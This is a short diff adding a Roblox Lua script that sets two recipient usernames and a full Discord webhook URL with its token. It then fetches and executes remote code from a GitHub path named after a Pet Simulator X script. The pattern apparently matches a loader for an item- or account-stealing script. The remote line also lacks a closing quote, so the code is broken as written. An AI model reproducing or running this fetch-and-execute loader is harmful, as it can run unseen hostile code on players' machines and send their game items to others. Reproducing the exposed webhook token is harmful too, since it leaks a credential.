@@ -1,0 +1,5 @@
+username = "SWAF78"
+username2 = "SWS_TY12"
+WebHookUrl = "https://discord.com/api/webhooks/1120206367031033876/tmJVdb3h3ajt-7cprrG1A5v32r7mfXWTLDQisJz6wqUvkIexLiLrNbw1DoUahugDR_gD"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MoonScriptt/MStlrPsx/main/PsxScriptbyMoon/Main/lua))()
